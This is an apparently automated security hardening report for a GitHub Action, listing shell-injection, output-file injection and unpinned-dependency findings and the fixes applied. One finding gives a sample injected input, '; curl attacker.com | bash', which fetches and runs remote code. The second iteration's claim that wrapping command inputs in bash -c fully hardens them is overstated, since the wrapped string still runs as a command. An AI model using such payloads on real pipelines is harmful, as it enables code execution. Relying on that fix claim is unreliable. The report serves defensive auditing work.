<!-- markdownlint-disable -->

# Hardening Report: asafamos--axle-action/v1.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **asafamos--axle-action/v1.0.0** was hardened automatically. 12 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (a): Multiple ${{ }} expressions are directly interpolated inside run: shell command strings in action.yml.

1. 'Resolve axle CLI package root' step (line 81): `echo "dir=${{ github.action_path }}/cli" >> "$GITHUB_OUTPUT"` — github.action_path interpolated directly in shell.

2. 'Build + start host project' step (lines 92-96): `${{ inputs.install-command }}`, `${{ inputs.build-command }}`, `nohup ${{ inputs.start-command }}`, and `"http://localhost:${{ inputs.wait-on-port }}"` are all directly interpolated as shell commands/arguments. An attacker-controlled input (e.g. install-command containing `; curl attacker.com | bash`) would execute arbitrary code.

3. 'Scan' step (lines 106-115): `TARGET="${{ inputs.url }}"`, `TARGET="http://localhost:${{ inputs.wait-on-port }}"`, `--fail-on "${{ inputs.fail-on }}"`, `--with-ai-fixes "${{ inputs.with-ai-fixes }}"`, `--max-ai-fixes "${{ inputs.max-ai-fixes }}"` are all directly interpolated in the run: shell script. All inputs.* values must be passed via env: variables and then referenced as quoted shell variables.

Locations:

- `action.yml:81`
- `action.yml:92`
- `action.yml:93`
- `action.yml:94`
- `action.yml:96`
- `action.yml:106`
- `action.yml:108`
- `action.yml:113`
- `action.yml:114`
- `action.yml:115`

### github-env-injection (severity: high)

The 'Resolve axle CLI package root' step writes ${{ github.action_path }} directly to $GITHUB_OUTPUT without sanitization (no `printf '%s' ... | tr -d '\n\r'` step). While github.action_path is typically controlled by GitHub, it is still a github.* context value and must be sanitized before being written to special environment files per the check rules. The offending line is: `echo "dir=${{ github.action_path }}/cli" >> "$GITHUB_OUTPUT"`

Locations:

- `action.yml:81`

### unpinned-uses (severity: high)

Four uses: references in action.yml are pinned to mutable version tags rather than immutable 40-character commit SHAs, making the action vulnerable to supply-chain attacks if the upstream tag is moved or compromised:
- `actions/setup-node@v4` (line 71)
- `actions/cache@v4` (line 82)
- `actions/upload-artifact@v4` (line 126)
- `actions/github-script@v7` (line 133)
Each should be pinned to a full SHA, e.g. `actions/setup-node@11bd71901bbe5b1630ceea73d27597364c9af683 # v4`.

Locations:

- `action.yml:71`
- `action.yml:82`
- `action.yml:126`
- `action.yml:133`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install-command }}" appears directly in run: block of step "Build + start host project (when url is empty)"; move to env: map

Locations:

- `action.yml:111`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build-command }}" appears directly in run: block of step "Build + start host project (when url is empty)"; move to env: map

Locations:

- `action.yml:112`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.start-command }}" appears directly in run: block of step "Build + start host project (when url is empty)"; move to env: map

Locations:

- `action.yml:113`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.wait-on-port }}" appears directly in run: block of step "Build + start host project (when url is empty)"; move to env: map

Locations:

- `action.yml:115`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.url }}" appears directly in run: block of step "Scan"; move to env: map

Locations:

- `action.yml:125`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.wait-on-port }}" appears directly in run: block of step "Scan"; move to env: map

Locations:

- `action.yml:127`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.fail-on }}" appears directly in run: block of step "Scan"; move to env: map

Locations:

- `action.yml:132`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.with-ai-fixes }}" appears directly in run: block of step "Scan"; move to env: map

Locations:

- `action.yml:133`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.max-ai-fixes }}" appears directly in run: block of step "Scan"; move to env: map

Locations:

- `action.yml:134`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, github-env-injection, static-inline-injection

**Notes:**

Fixed all findings in action.yml: (1) Pinned actions/setup-node@v4 to SHA 49933ea5288caeca8642d1e84afbd3f7d6820020, actions/cache@v4 to 0057852bfaa89a56745cba8c7296529d2fc39830, actions/upload-artifact@v4 to ea165f8d65b6e75b540449e92b4886f43607fa02, and actions/github-script@v7 to f28e40c7f34bde8b3046d885e986cb6290c5673b. (2) Moved all ${{ inputs.* }} expressions out of run: blocks into env: blocks for both 'Build + start host project' and 'Scan' steps. (3) Fixed github-env-injection by moving ${{ github.action_path }} into an env: variable (ACTION_PATH) and sanitizing it with printf '%s' | tr -d '\n\r' before writing to GITHUB_OUTPUT.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed the 'Build + start host project' step in action.yml. The unquoted $INSTALL_COMMAND, $BUILD_COMMAND, and $START_COMMAND variables were changed to use `bash -c "$VAR"` form, which keeps the variable double-quoted (preventing word splitting and glob expansion at the outer shell level) while still executing the command string. The $WAIT_ON_PORT variable was already inside a double-quoted string and remains safely quoted. Lines 119-121 and 123 are now hardened against shell metacharacter injection.

